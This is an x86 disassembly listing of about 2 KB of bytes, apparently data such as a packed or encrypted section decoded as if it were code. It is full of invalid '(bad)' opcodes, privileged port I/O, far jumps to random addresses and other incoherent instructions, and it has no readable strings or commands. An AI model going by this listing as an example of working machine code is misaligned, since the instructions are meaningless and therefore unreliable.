  425a6c:	repz mov ecx,0xd7bfd8e5
  425a72:	lock not ebp
  425a75:	(bad)  
  425a76:	(bad)  
  425a77:	loop   0x425a83
  425a79:	or     al,cl
  425a7b:	in     al,0xa
  425a7d:	call   0xfe4f444c
  425a82:	test   eax,0xe0d2e3af
  425a87:	(bad)  
  425a88:	shr    BYTE PTR [ebp+ebp*8-0x48221852],cl
  425a8f:	fucomi st,st(2)
  425a91:	shl    ecx,cl
  425a93:	out    dx,eax
  425a94:	call   ebx
  425a96:	fdivrp st(5),st
  425a98:	loopne 0x425a6a
  425a9a:	(bad)  
  425a9c:	out    0xf6,eax
  425a9e:	add    eax,0xd9f20f01
  425aa3:	rcl    edi,1
  425aa5:	scas   eax,DWORD PTR es:[edi]
  425aa6:	repnz stos BYTE PTR es:[edi],al
  425aa8:	fucomi st,st(5)
  425aaa:	out    dx,eax
  425aab:	in     al,0xba
  425aad:	in     al,0xf4
  425aaf:	mov    eax,0xb9d5ece8
  425ab4:	mov    esi,0x2bad602
  425ab9:	retf   
  425aba:	pop    es
  425abb:	jmp    0x425a9f
  425abd:	jmp    0xf2f2:0xe3fed90e
  425ac4:	int    0xcf
  425ac6:	(bad)  
  425ac7:	(bad)
  425aca:	enter  0xadd8,0xf6
  425ace:	(bad)  
  425acf:	out    dx,eax
  425ad0:	add    dh,BYTE PTR [ebx+edx*8-0x40180c25]
  425ad7:	jmp    esp
  425ad9:	rcr    dh,1
  425adb:	retf   
  425adc:	out    dx,al
  425add:	fild   WORD PTR [ecx]
  425adf:	push   cs
  425ae0:	loop   0x425ae2
  425ae2:	out    0xbc,al
  425ae4:	retf   
  425ae5:	fucom  st(0)
  425ae7:	in     al,0xea
  425ae9:	ret    0xeaf2
  425aec:	in     eax,dx
  425aed:	stc    
  425aee:	call   0xb8172ebf
  425af3:	add    ebp,esi
  425af5:	add    eax,0xfeffd3de
  425afa:	rol    DWORD PTR [edx+ebp*8],1
  425afd:	clc    
  425afe:	add    ch,ch
  425b00:	add    dh,ch
  425b02:	mov    cl,0xc1
  425b04:	mov    bl,0xd0
  425b06:	retf   0xb1ed
  425b09:	shl    esi,cl
  425b0b:	iret   
  425b0c:	idiv   bl
  425b0e:	(bad)  
  425b10:	fld    st(3)
  425b12:	int3   
  425b13:	clc    
  425b14:	hlt    
  425b15:	loopne 0x425af5
  425b17:	(bad)  
  425b18:	fcomip st,st(0)
  425b1a:	sti    
  425b1b:	(bad)  
  425b1c:	or     cl,bh
  425b1e:	paddusw mm4,mm5
  425b21:	or     eax,0xc1b1d8ab
  425b26:	out    dx,al
  425b27:	in     al,0xc2
  425b29:	aam    0xb6
  425b2b:	mov    ebx,0xd6fab9ba
  425b30:	mov    cl,0xe3
  425b32:	fcomip st,st(3)
  425b34:	cmc    
  425b35:	rcl    esp,1
  425b37:	repz fndisi(8087 only) 
  425b3a:	add    ch,dl
  425b3c:	or     ebp,ebx
  425b3e:	fiadd  WORD PTR [ebx+eax*1]
  425b41:	adc    ebx,ebp
  425b43:	mov    eax,0xe9d4b3d5
  425b49:	ret    0xf5b6
  425b4c:	sti    
  425b4d:	iret   
  425b4e:	out    dx,al
  425b4f:	enter  0xecfb,0x3
  425b53:	iret   
  425b54:	(bad)  
  425b55:	out    dx,al
  425b56:	shl    esp,cl
  425b58:	add    bl,al
  425b5a:	retf   0xe208
  425b5d:	jmp    0xa21215b
  425b62:	repnz scas al,BYTE PTR es:[edi]
  425b64:	ret    0xcbb7
  425b67:	mov    ch,0xc7
  425b69:	repnz cli 
  425b6b:	in     eax,0xb4
  425b6d:	(bad)  
  425b6f:	(bad)  
  425b70:	out    dx,al
  425b71:	rol    ebx,1
  425b73:	out    dx,al
  425b74:	mov    ecx,0xc1fde4f0
  425b79:	jmp    0x425b5a
  425b7b:	jmp    0x425b56
  425b7d:	aad    0xef
  425b7f:	out    dx,eax
  425b80:	(bad)  
  425b82:	mov    edi,0xcbe2f1bc
  425b87:	lods   al,BYTE PTR ds:[esi]
  425b88:	jmp    0xf7364048
  425b8d:	neg    ecx
  425b8f:	fstp   TBYTE PTR [ebx+eiz*8-0xc463d1e]
  425b96:	cld    
  425b97:	xlat   BYTE PTR ds:[ebx]
  425b98:	cld    
  425b99:	test   DWORD PTR [esi],0x1fceae7
  425b9f:	enter  0x1dc,0xc4
  425ba3:	mov    cl,0xb0
  425ba5:	retf   
  425ba6:	leave  
  425ba7:	test   ecx,0xedf9dbf5
  425bad:	jmp    0xeb1d52ab
  425bb2:	shl    edi,0xdb
  425bb5:	stc    
  425bb6:	xlat   BYTE PTR ds:[ebx]
  425bb7:	add    ebx,ebx
  425bb9:	jmp    0x9f9:0xed04c0d6
  425bc0:	adc    bh,al
  425bc2:	in     al,0xac
  425bc4:	ret    0xd0b3
  425bc7:	retf   
  425bc8:	lods   eax,DWORD PTR ds:[esi]
  425bc9:	test   cl,0xff
  425bcc:	mov    bh,0xe4
  425bce:	cld    
  425bcf:	fmul   st(2),st
  425bd1:	(bad)  
  425bd2:	clc    
  425bd3:	mov    ecx,0xdff7f306
  425bd8:	out    0xc1,eax
  425bda:	clc    
  425bdb:	(bad)  
  425bdc:	in     eax,0xcf
  425bde:	leave  
  425bdf:	add    esp,ebp
  425be1:	retf   0xf1dc
  425be4:	shr    BYTE PTR [eax-0x38524c0c],cl
  425bea:	mov    cl,0xd6
  425bec:	inc    ah
  425bee:	hlt    
  425bef:	test   BYTE PTR [edx],0xef
  425bf2:	in     eax,dx
  425bf3:	out    dx,eax
  425bf4:	cld    
  425bf5:	aam    0xd8
  425bf7:	mov    edx,0xfbc3dec2
  425bfc:	(bad)  
  425bfd:	out    0xfc,al
  425bff:	loopne 0x425bde
  425c01:	retf   
  425c02:	icebp  
  425c03:	icebp  
  425c04:	jmp    0xb9d1:0xead5e8f2
  425c0b:	icebp  
  425c0c:	(bad)  
  425c0e:	mov    esi,0xb9bbeccd
  425c13:	(bad)  
  425c15:	loop   0x425c13
  425c17:	mov    edi,0xe10ff1d5
  425c1d:	hlt    
  425c1e:	in     al,dx
  425c1f:	jmp    0x425bfa
  425c21:	add    ah,bl
  425c23:	mul    edi
  425c25:	scas   al,BYTE PTR es:[edi]
  425c26:	fmul   st(3),st
  425c28:	shr    ebx,0xb0
  425c2b:	sti    
  425c2c:	(bad)  
  425c2d:	mov    eax,0xb0bdfbfc
  425c32:	cld    
  425c33:	(bad)  
  425c35:	sar    ah,0xf6
  425c38:	ffree  st(5)
  425c3a:	mov    dh,0xcf
  425c3d:	mov    esp,0x1d9eee0
  425c42:	les    ebp,FWORD PTR [edx-0x14333930]
  425c48:	cli    
  425c49:	mov    bl,0xee
  425c4b:	rcr    al,1
  425c4d:	xlat   BYTE PTR ds:[ebx]
  425c4e:	mov    ebp,0xb8cafbe9
  425c53:	cmc    
  425c54:	aad    0x7
  425c56:	shr    ah,1
  425c58:	jecxz  0x425c1f
  425c5a:	xlat   BYTE PTR ds:[ebx]
  425c5b:	in     al,0xc0
  425c5d:	sar    bl,0xb
  425c60:	(bad)
  425c63:	out    0xa8,eax
  425c65:	imul   BYTE PTR [ebx-0x1e4f3a34]
  425c6b:	in     al,dx
  425c6c:	dec    dl
  425c6e:	shl    DWORD PTR [ebx+edi*4-0x19320b1d],cl
  425c75:	in     eax,0xd2
  425c77:	in     al,dx
  425c78:	hlt    
  425c79:	sar    ch,1
  425c7b:	neg    ebx
  425c7d:	or     al,BYTE PTR [edi]
  425c7f:	leave  
  425c80:	add    ebx,esp
  425c82:	enter  0xcbbf,0xeb
  425c86:	(bad)  
  425c87:	int3   
  425c88:	(bad)  
  425c89:	cmc    
  425c8a:	icebp  
  425c8b:	(bad)
  425c8f:	mov    edi,0xbcdcf8
  425c94:	out    dx,al
  425c95:	add    al,BYTE PTR [eax]
  425c97:	fadd   QWORD PTR [esi]
  425c99:	retf   
  425c9a:	or     bh,BYTE PTR [esi+0x508edca]
  425ca0:	clc    
  425ca1:	jmp    0xd1f10c65
  425ca6:	div    ebx
  425ca8:	mov    dl,0xb1
  425caa:	call   0xc53c5084
  425caf:	shl    al,cl
  425cb1:	(bad)  
  425cb3:	rcl    ebp,0xe0
  425cb6:	cmc    
  425cb7:	out    0xe5,eax
  425cb9:	or     edi,edi
  425cbb:	(bad)  
  425cbd:	or     cl,BYTE PTR [edx]
  425cbf:	or     ecx,ebx
  425cc1:	push   es
  425cc2:	shl    edi,cl
  425cc4:	in     al,0xd5
  425cc6:	int    0xd0
  425cc8:	enter  0xf0e9,0xc8
  425ccc:	mov    al,0xf6
  425cce:	enter  0xdabd,0xf7
  425cd2:	xlat   BYTE PTR ds:[ebx]
  425cd3:	repz std 
  425cd5:	add    eax,DWORD PTR [edi]
  425cd7:	inc    ebx
  425cd9:	rcr    ecx,0xe8
  425cdc:	xlat   BYTE PTR ds:[ebx]
  425cdd:	out    0xfa,al
  425cdf:	iret   
  425ce0:	in     al,dx
  425ce1:	add    ah,bl
  425ce3:	shl    al,1
  425ce5:	out    dx,eax
  425ce6:	call   0xd10a10e6
  425ceb:	test   ebp,0xdddbeac9
  425cf1:	mov    esi,0xf0dfd8b7
  425cf6:	sti    
  425cf7:	repz clc 
  425cf9:	inc    ch
  425cfb:	aad    0xe
  425cfd:	(bad)  
  425cff:	iret   
  425d00:	(bad)  
  425d02:	into   
  425d03:	ret    0xeef6
  425d06:	cmc    
  425d07:	(bad)  
  425d08:	lods   al,BYTE PTR ds:[esi]
  425d09:	int3   
  425d0a:	stc    
  425d0b:	loopne 0x425d03
  425d0d:	int    0xe9
  425d0f:	mul    dl
  425d11:	loope  0x425cdf
  425d13:	in     eax,dx
  425d14:	push   es
  425d15:	idiv   cl
  425d17:	in     al,0xdb
  425d19:	ret    0xdad5
  425d1c:	jecxz  0x425cf9
  425d1e:	push   cs
  425d1f:	aam    0xe
  425d21:	adc    bh,BYTE PTR [esi-0x29103f20]
  425d27:	shl    esi,0xeb
  425d2a:	(bad)  
  425d2c:	rcr    edx,1
  425d2e:	sar    DWORD PTR [ebp-0x110dfc13],cl
  425d34:	fadd   st,st(1)
  425d36:	stc    
  425d37:	(bad)  
  425d38:	loopne 0x425d36
  425d3a:	in     al,0xeb
  425d3c:	push   cs
  425d3d:	call   0xe21d4c31
  425d42:	call   0xdd245414
  425d47:	lock xlat BYTE PTR ds:[ebx]
  425d49:	out    dx,al
  425d4a:	mov    dh,0xb1
  425d4c:	mov    ah,0xd7
  425d4e:	mov    bh,0xc8
  425d50:	retf   0xecd4
  425d53:	(bad)  
  425d54:	icebp  
  425d55:	aam    0xde
  425d57:	std    
  425d58:	cli    
  425d59:	ret    0xfdd0
  425d5c:	in     eax,0xf4
  425d5e:	ret    
  425d5f:	add    eax,ebp
  425d61:	shl    bl,cl
  425d63:	test   eax,0xacefbcbe
  425d68:	xlat   BYTE PTR ds:[ebx]
  425d69:	loop   0x425d2f
  425d6b:	mov    al,0xd8
  425d6d:	fcomip st,st(3)
  425d6f:	xlat   BYTE PTR ds:[ebx]
  425d70:	call   0xbd062d4d
  425d75:	fucom  st(7)
  425d77:	fcmovb st,st(3)
  425d79:	rol    BYTE PTR [esi],0xd4
  425d7c:	fcmovnu st,st(0)
  425d7e:	jmp    0xe9f1:0xf200cbec
  425d85:	shl    DWORD PTR [ebx-0x324e2a31],cl
  425d8b:	fld1   
  425d8d:	enter  0xd5f2,0xeb
  425d91:	add    ebp,esp
  425d93:	int    0xbd
  425d95:	lock mov BYTE PTR ds:0xfbcad6d8,0xe7
  425d9d:	jmp    0x525236c
  425da2:	repnz ror dh,cl
  425da5:	shr    ah,1
  425da7:	leave  
  425da8:	mov    al,0xd9
  425daa:	aam    0xce
  425dac:	clc    
  425dad:	sti    
  425dae:	repnz mov dh,0xca
  425db1:	mov    ah,0xd7
  425db3:	mov    edi,0xe7e507cf
  425db8:	add    ebx,ecx
  425dba:	idiv   esp
  425dbc:	jecxz  0x425dcb
  425dbe:	add    ecx,esi
  425dc0:	or     al,0xfc
  425dc2:	repz retf 0xcfcd
  425dc6:	lods   eax,DWORD PTR ds:[esi]
  425dc7:	jmp    0x425d98
  425dc9:	hlt    
  425dca:	in     al,0xe7
  425dcc:	stc    
  425dcd:	aad    0xfb
  425dcf:	fdivr  QWORD PTR [ebp-0x2b460302]
  425dd5:	lock add bl,bl
  425dd8:	sti    
  425dd9:	rcl    bh,0xd4
  425ddc:	loop   0x425db2
  425dde:	iret   
  425ddf:	or     eax,0xa6c8f3cc
  425de4:	mov    bh,0xbd
  425de6:	(bad)  
  425de7:	jmp    0x425daf
  425de9:	aad    0xc8
  425deb:	(bad)  
  425ded:	(bad)  
  425def:	jmp    0x425dbb
  425df1:	(bad)  
  425df3:	(bad)  
  425df5:	in     al,dx
  425df6:	(bad)  
  425df8:	in     al,0xcb
  425dfa:	fucom  st(2)
  425dfc:	stc    
  425dfd:	leave  
  425dfe:	or     bh,al
  425e00:	add    eax,ebx
  425e02:	leave  
  425e03:	in     al,0xc7
  425e05:	retf   0xcfe3
  425e08:	aad    0xc9
  425e0a:	lock mov al,0xb0
  425e0d:	stc    
  425e0e:	cld    
  425e0f:	mov    ebp,0xc202e1b4
  425e14:	div    ebp
  425e16:	fadd   st,st(2)
  425e18:	out    0xda,al
  425e1a:	or     edx,esp
  425e1c:	std    
  425e1d:	mov    ch,0xd
  425e20:	repnz int3 
  425e22:	jecxz  0x425e0f
  425e24:	out    dx,eax
  425e25:	scas   al,BYTE PTR es:[edi]
  425e26:	lods   al,BYTE PTR ds:[esi]
  425e27:	iret   
  425e28:	out    dx,eax
  425e29:	(bad)  
  425e2a:	hlt    
  425e2b:	repnz ror edx,1
  425e2e:	(bad)  
  425e2f:	call   eax
  425e31:	iret   
  425e32:	add    dl,ch
  425e34:	fcom   st(6)
  425e36:	fnstsw WORD PTR [edx-0x8381827]
  425e3c:	add    eax,0xce40dd8
  425e41:	out    0xf1,al
  425e43:	fstp   st(4)
  425e45:	retf   0xd3ef
  425e48:	in     eax,0xf9
  425e4a:	retf   
  425e4b:	(bad)  
  425e4c:	faddp  st(6),st
  425e4e:	mov    ch,0xd9
  425e50:	mov    eax,0x3fff0ef
  425e55:	in     eax,0xe5
  425e57:	int3   
  425e58:	pop    es
  425e59:	in     al,0xd9
  425e5b:	(bad)  
  425e5c:	clc    
  425e5d:	fcmovb st,st(3)
  425e5f:	loopne 0x425e5f
  425e61:	fcmovbe st,st(0)
  425e63:	(bad)  
  425e64:	retf   
  425e65:	fsub   st(3),st
  425e67:	mov    bh,0xe6
  425e69:	lock (bad) 
  425e6b:	in     eax,0xc8
  425e6d:	ror    dl,1
  425e6f:	cld    
  425e70:	int3   
  425e71:	in     eax,dx
  425e72:	mov    esp,0x500dcc1
  425e77:	hlt    
  425e78:	add    DWORD PTR [ebx],eax
  425e7a:	sti    
  425e7b:	fcomip st,st(6)
  425e7d:	jecxz  0x425e89
  425e7f:	out    dx,al
  425e80:	add    eax,eax
  425e82:	enter  0xcbcc,0xdd
  425e86:	int    0xe9
  425e88:	into   
  425e89:	(bad)  
  425e8a:	repz fdiv st,st(6)
  425e8d:	fcomi  st,st(2)
  425e8f:	cld    
  425e90:	sar    cl,1
  425e92:	fcmove st,st(5)
  425e94:	ret    
  425e95:	(bad)  
  425e97:	mov    ebp,0xeafadfd1
  425e9c:	imul   cl
  425e9e:	aad    0x2
  425ea0:	repnz or al,0xf3
  425ea3:	mov    dl,0xa9
  425ea5:	lods   al,BYTE PTR ds:[esi]
  425ea6:	shr    al,0xe4
  425ea9:	loope  0x425e84
  425eab:	in     al,dx
  425eac:	(bad)  
  425ead:	int    0xe4
  425eaf:	jmp    0xeed6:0xddb8f8d8
  425eb6:	add    eax,0xbf0be3fe
  425ebb:	add    edi,eax
  425ebd:	rcr    dl,0xc4
  425ec0:	add    eax,0xecb1d311
  425ec5:	scas   al,BYTE PTR es:[edi]
  425ec6:	jecxz  0x425e90
  425ec8:	ret    
  425ec9:	loopne 0x425e91
  425ecb:	cmc    
  425ecc:	call   0xe93959b9
  425ed1:	mov    al,0xd2
  425ed3:	aad    0xdd
  425ed5:	in     eax,0xe6
  425ed7:	sti    
  425ed8:	rol    DWORD PTR ds:0xdae2ebe8,1
  425ede:	push   es
  425edf:	adc    ebx,edx
  425ee1:	or     al,0xcb
  425ee3:	mov    eax,0xb7c6a8be
  425ee8:	mov    dl,0xcc
  425eeb:	jmp    0xdcdb:0xeecdd2d2
  425ef2:	fcmovu st,st(5)
  425ef4:	hlt    
  425ef5:	in     eax,0xd8
  425ef7:	xlat   BYTE PTR ds:[ebx]
  425ef8:	or     al,BYTE PTR [ebx]
  425efa:	xlat   BYTE PTR ds:[ebx]
  425efb:	or     eax,DWORD PTR [esi]
  425efd:	add    al,BYTE PTR ds:0xdfdef3cf
  425f03:	mov    eax,0xebb7aee3
  425f08:	retf   
  425f09:	jmp    0xfaef:0xf1fbeae7
  425f10:	ror    dh,1
  425f12:	call   ebx
  425f14:	fstp   TBYTE PTR [esi-0x1d1b3d41]
  425f1a:	icebp  
  425f1b:	lock idiv ebp
  425f1e:	in     al,0xd9
  425f20:	or     eax,0xbfc7ad0c
  425f25:	(bad)  
  425f26:	mov    dl,0xc9
  425f28:	fcmovnb st,st(7)
  425f2a:	icebp  
  425f2b:	leave  
  425f2c:	repnz frstpm(287 only) 
  425f2f:	int3   
  425f30:	fstp   TBYTE PTR [esi-0x1e2e261f]
  425f36:	out    0xf8,eax
  425f38:	inc    al
  425f3a:	fimul  WORD PTR [edx]
  425f3c:	fadd   QWORD PTR [edi]
  425f3e:	loope  0x425f25
  425f40:	bswap  edi
  425f42:	int    0xe7
  425f44:	in     al,0xc9
  425f46:	loopne 0x425ef8
  425f48:	shl    eax,0xd3
  425f4b:	xlat   BYTE PTR ds:[ebx]
  425f4c:	shr    eax,1
  425f4e:	mov    ebp,0xbcf7d1fa
  425f53:	out    0xfd,eax
  425f55:	fidivr WORD PTR [esi-0x16274243]
  425f5b:	ret    0xc704
  425f5e:	std    
  425f5f:	add    edx,edi
  425f61:	ror    ch,0xeb
  425f64:	(bad)
  425f67:	mov    cl,0xe0
  425f69:	out    dx,al
  425f6a:	out    dx,al
  425f6b:	fdivr  st,st(3)
  425f6d:	icebp  
  425f6e:	stc    
  425f6f:	in     eax,dx
  425f70:	in     eax,dx
  425f71:	loope  0x425f5f
  425f73:	int3   
  425f74:	lock ret 0x1de
  425f78:	fsubrp st(7),st
  425f7a:	fcmovbe st,st(7)
  425f7c:	leave  
  425f7d:	out    0xed,al
  425f7f:	fucomi st,st(5)
  425f81:	(bad)  
  425f82:	fst    st(3)
  425f84:	ret    
  425f85:	mov    dh,0xee
  425f87:	lods   eax,DWORD PTR ds:[esi]
  425f88:	shr    al,0xc8
  425f8b:	(bad)  
  425f8c:	mov    edx,0xfdf3fdea
  425f91:	(bad)  
  425f92:	rcr    edi,cl
  425f94:	ret    
  425f95:	mov    esp,0xc70205bd
  425f9a:	lock les ecx,FWORD PTR [edi]
  425f9d:	out    dx,eax
  425f9e:	jmp    0xc5c8:0xdfc9dacf
  425fa5:	(bad)  
  425fa7:	(bad)  
  425fa8:	icebp  
  425fa9:	aam    0xfb
  425fab:	cli    
  425fac:	not    ebp
  425fae:	(bad)  
  425faf:	clc    
  425fb0:	jmp    0x425f9a
  425fb2:	sar    edi,cl
  425fb4:	hlt    
  425fb5:	ret    0xeb00
  425fb8:	fdivrp st(5),st
  425fba:	jmp    0xdcfd:0xe6caf4e8
  425fc1:	add    al,0xed
  425fc3:	fidiv  WORD PTR [ecx-0x533f150a]
  425fc9:	stc    
  425fca:	in     eax,dx
  425fcb:	int3   
  425fcc:	lock retf 
  425fce:	int    0xde
  425fd0:	add    dh,dh
  425fd2:	mov    bh,0xd0
  425fd4:	out    dx,al
  425fd5:	int    0xc2
  425fd7:	cli    
  425fd8:	sti    
  425fd9:	inc    bh
  425fdb:	aam    0xef
  425fdd:	in     eax,0xe3
  425fdf:	fcmovne st,st(3)
  425fe1:	jmp    0xd6233892
  425fe6:	in     al,dx
  425fe7:	iret   
  425fe8:	out    0xb4,al
  425fea:	xlat   BYTE PTR ds:[ebx]
  425feb:	mov    ebp,0xb5bff9ea
  425ff1:	(bad)  
  425ff2:	mov    esp,0xf005dad5
  425ff7:	mov    esi,0xe1d5ebd1
  425ffc:	push   es
  425ffd:	imul   bh
  425fff:	loop   0x42600f
  426001:	out    dx,al
  426002:	jmp    0xb5d4:0xf5d1ccc0
  426009:	in     eax,0xcc
  42600b:	loopne 0x425fe4
  42600d:	std    
  42600e:	sti    
  42600f:	mov    edx,0xb6d3c3b1
  426014:	repz xlat BYTE PTR ds:[ebx]
  426016:	fld    DWORD PTR [ecx]
  426018:	cmc    
  426019:	fxch   st(2)
  42601b:	lock fmul QWORD PTR [esi]
  42601e:	clc    
  42601f:	loope  0x426022
  426021:	cld    
  426022:	leave  
  426023:	leave  
  426024:	jmp    0x426016
  426026:	iret   
  426027:	sti    
  426028:	out    0xc9,eax
  42602a:	mov    ch,0xf5
  42602c:	stc    
  42602d:	in     al,0xff
  42602f:	jmp    0xc03e1f22
  426034:	push   es
  426035:	add    esi,ebx
  426037:	mul    bh
  426039:	rcr    bl,1
  42603b:	fucom  st(2)
  42603d:	cmc    
  42603e:	or     dl,al
  426040:	out    0xc9,eax
  426042:	shl    bl,cl
  426044:	loop   0x426022
  426046:	(bad)  
  426047:	mov    al,0xdb
  426049:	test   al,0xe0
  42604b:	mov    ch,0xf0
  42604d:	iret   
  42604e:	out    dx,eax
  42604f:	shr    ebp,1
  426051:	int3   
  426052:	enter  0xecd0,0xfa
  426056:	fsubrp st(2),st
  426058:	sti    
  426059:	in     eax,0x4
  42605b:	aam    0xdf
  42605d:	retf   
  42605e:	or     eax,0xeeebe5dd
  426063:	lods   al,BYTE PTR ds:[esi]
  426064:	out    dx,eax
  426065:	mov    dl,0xac
  426067:	xlat   BYTE PTR ds:[ebx]
  426068:	hlt    
  426069:	fnstcw WORD PTR [ebx-0x4c04141b]
  42606f:	clc    
  426070:	shl    ebx,cl
  426072:	rol    BYTE PTR [edx],cl
  426074:	sar    ecx,0xfc
  426077:	cld    
  426078:	loope  0x42606a
  42607a:	aad    0xf6
  42607c:	or     edi,ebx
  42607e:	stc    
  42607f:	(bad)  
  426080:	std    
  426081:	call   0xd8163d31
  426086:	scas   eax,DWORD PTR es:[edi]
  426087:	jmp    0xeed4:0xe8cde8ed
  42608e:	mov    ebx,0xe1bcd6d0
  426093:	in     al,dx
  426094:	shl    bl,0xbe
  426097:	xlat   BYTE PTR ds:[ebx]
  426098:	mov    esp,0xdec0c2c6
  42609d:	add    dl,ch
  42609f:	int3   
  4260a0:	iret   
  4260a1:	add    eax,0xc3ecc4cb
  4260a6:	out    0xc2,eax
  4260a8:	(bad)  
  4260aa:	loope  0x4260a0
  4260ac:	fdiv   DWORD PTR [ebp-0x3c014a18]
  4260b2:	sar    DWORD PTR [edx+0x2fdd3c0],cl
  4260b8:	sar    ebp,cl
  4260ba:	neg    dl
  4260bc:	fldpi  
  4260be:	cmc    
  4260bf:	vmovsd QWORD PTR [ebp-0x394e5a5a],xmm7
  4260c7:	jmp    0xeed5:0xcaeef1c5
  4260ce:	(bad)  
  4260d0:	ror    ah,cl
  4260d2:	icebp  
  4260d3:	add    eax,DWORD PTR [edi]
  4260d5:	add    eax,DWORD PTR [esp+edi*8]
  4260d8:	shr    edx,cl
  4260da:	shl    esp,0xb
  4260dd:	dec    DWORD PTR [edx]
  4260df:	pop    es
  4260e0:	out    dx,al
  4260e1:	or     dl,al
  4260e3:	loopne 0x4260d7
  4260e5:	shl    edx,1
  4260e7:	sti    
  4260e8:	in     al,0xda
  4260ea:	enter  0xf3e6,0xcf
  4260ee:	in     al,0xee
  4260f0:	div    esp
  4260f2:	add    ch,bh
  4260f4:	fsubp  st(5),st
  4260f6:	mov    esi,0xf7e0f3d2
  4260fb:	shr    bl,1
  4260fd:	out    dx,al
  4260fe:	hlt    
  4260ff:	(bad)
  426102:	jmp    0xd03327e4
  426107:	jmp    0xf21012d2
  42610c:	in     al,0xb7
  42610e:	mov    ebp,0xd4f7d9ea
  426113:	icebp  
  426114:	(bad)  
  426116:	rol    eax,0xc1
  426119:	add    ebx,ebp
  42611b:	jmp    0xf1fc:0x70ef5f5
  426122:	mov    ecx,0xeee6aee7
  426127:	not    edx
  426129:	into   
  42612a:	aad    0xf4
  42612c:	(bad)  
  42612d:	in     al,0xd8
  42612f:	leave  
  426130:	cld    
  426131:	not    ebp
  426133:	div    ecx
  426135:	fiadd  DWORD PTR [edi]
  426137:	fprem1 
  426139:	in     al,0x9
  42613b:	sti    
  42613c:	fst    st(4)
  42613e:	(bad)  
  426140:	or     ah,dl
  426142:	in     al,0xce
  426144:	out    0xef,eax
  426146:	shl    eax,1
  426148:	aam    0xb3
  42614a:	repnz mov ch,0xf0
  42614d:	int    0xdb
  42614f:	mov    ebp,0xbef3ccec
  426154:	idiv   eax
  426156:	mov    ebp,0xe1e5e6d3
  42615b:	(bad)  
  42615d:	fisttp DWORD PTR [edi]
  42615f:	loopne 0x42616c
  426161:	adc    bl,al
  426163:	mov    al,0xbd
  426165:	leave  
  426166:	hlt    
  426167:	mov    bl,0xe6
  426169:	aad    0xb5
  42616b:	icebp  
  42616c:	(bad)  
  42616d:	(bad)  
  42616f:	mov    ebx,0xceedecc3
  426174:	mov    eax,0xd7d2fcc2
  426179:	add    eax,esp
  42617b:	out    dx,eax
  42617c:	in     eax,0xc4
  42617e:	sti    
  42617f:	(bad)  
  426180:	stc    
  426181:	jmp    0xb3193958
  426186:	hlt    
  426187:	rol    dh,0xf2
  42618a:	not    ah
  42618c:	lods   eax,DWORD PTR ds:[esi]
  42618d:	out    0xe5,al
  42618f:	(bad)  
  426190:	fidivr WORD PTR [eax-0x12064232]
  426196:	rcr    ah,0x3
  426199:	(bad)  
  42619b:	or     ecx,eax
  42619d:	jmp    0x426177
  42619f:	retf   
  4261a0:	jmp    0xdded:0xe6f7bef9
  4261a7:	loope  0x426197
  4261a9:	iret   
  4261aa:	loopne 0x4261a2
  4261ac:	mov    ecx,0xd7cdccb4
  4261b1:	mov    esp,0xdbbfeed8
  4261b6:	mov    esp,0x5c6f7e1
  4261bb:	shr    eax,0xde
  4261be:	enter  0xfe7,0xd2
  4261c2:	in     al,0xb0
  4261c4:	ret    
  4261c5:	in     al,0xf0
  4261c7:	jecxz  0x42618d
  4261c9:	aam    0xb2
  4261cb:	int3   
  4261cc:	(bad)  
  4261ce:	cmc    
  4261cf:	into   
  4261d0:	(bad)  
  4261d2:	add    ah,al
  4261d4:	rol    BYTE PTR [edx],0xd1
  4261d7:	rol    edx,cl
  4261d9:	cmc    
  4261da:	stc    
  4261db:	(bad)  [ebx]
  4261dd:	clc    
  4261de:	fld    DWORD PTR [esi]
  4261e0:	stc    
  4261e1:	jecxz  0x42618e
  4261e3:	repnz in eax,dx
  4261e5:	shr    edx,0xf2
  4261e8:	aad    0xf6
  4261ea:	fdivr  st,st(7)
  4261ec:	jmp    0xfffd:0xfeffb7ff
  4261f3:	iret   
  4261f4:	repnz add bl,dl
  4261f7:	sti    
  4261f8:	retf   
  4261f9:	test   BYTE PTR [eax],0xb
  4261fc:	aam    0xc7
  4261fe:	aad    0xcc
  426200:	adc    eax,DWORD PTR [esi]
  426202:	ret    
  426203:	mov    edi,0xcce9cca8
  426208:	jmp    0xded2:0xd8e6fbb7
  42620f:	jmp    0x42620d
  426211:	into   
  426212:	out    dx,al
  426213:	repnz loop 0x426219
  426216:	xlat   BYTE PTR ds:[ebx]
  426217:	mov    esp,0xbdeddeb
  42621c:	xlat   BYTE PTR ds:[ebx]
  42621d:	iret   
  42621e:	enter  0xddd9,0xdd
  426222:	stos   BYTE PTR es:[edi],al
  426223:	lods   eax,DWORD PTR ds:[esi]
  426224:	mov    bh,0xed
  426226:	rcl    ch,cl
  426228:	out    dx,al
  426229:	(bad)  
  42622a:	stc    
  42622b:	mov    eax,0xbdbbcfb8
  426230:	shl    dl,cl
  426232:	out    dx,eax
  426233:	out    0xe7,eax
  426235:	add    ah,ah
  426237:	(bad)
  42623a:	(bad)  
  42623c:	cli    
  42623d:	add    eax,0xf9dbe0cb
  426242:	in     al,0xdc
  426244:	ror    esi,0xb6
  426247:	leave  
  426248:	mov    bh,0xd3
  42624a:	sti    
  42624b:	into   
  42624c:	shl    eax,cl
  42624e:	int3   
  42624f:	in     eax,dx
  426250:	cld    
  426251:	sti    
  426252:	clc    
  426253:	mov    eax,0xc2e1ee07
  426258:	fcmovu st,st(7)
  42625a:	add    edx,ebp
  42625c:	mov    BYTE PTR [ebx],0xc5
  42625f:	enter  0xcc09,0xb2
  426263:	(bad)
  426266:	xlat   BYTE PTR ds:[ebx]
  426267:	rcl    al,0xc7
  42626a:	xlat   BYTE PTR ds:[ebx]
  42626b:	jmp    0xfbf4:0xf4d9b5f1
  426272:	into   
  426273:	in     eax,dx
  426274:	aam    0xf5
  426276:	int    0xf4
  426278:	fnstcw WORD PTR [esp+ebx*8-0x240bf82c]
  42627f:	(bad)  
  426280:	out    0xdd,eax
  426282:	sar    BYTE PTR [edi-0x2c523f4f],1
  426288:	sti    
  426289:	(bad)  
  42628a:	iret   
  42628b:	(bad)  
  42628c:	icebp  
  42628d:	icebp  
  42628e:	iret   
  42628f:	fyl2xp1 
  426291:	cmc    
  426292:	rcr    edi,0xfc
  426295:	cld    
  426296:	hlt    
  426297:	ret    
  426298:	retf   
  426299:	loope  0x4262a2
  42629b:	or     ecx,DWORD PTR [edx]
  42629d:	paddd  mm0,QWORD PTR [eax]
  4262a0:	int3   
  4262a1:	add    esp,esp
  4262a3:	ret    
  4262a4:	imul   al
  4262a6:	enter  0xc6c0,0xba
  4262aa:	(bad)  
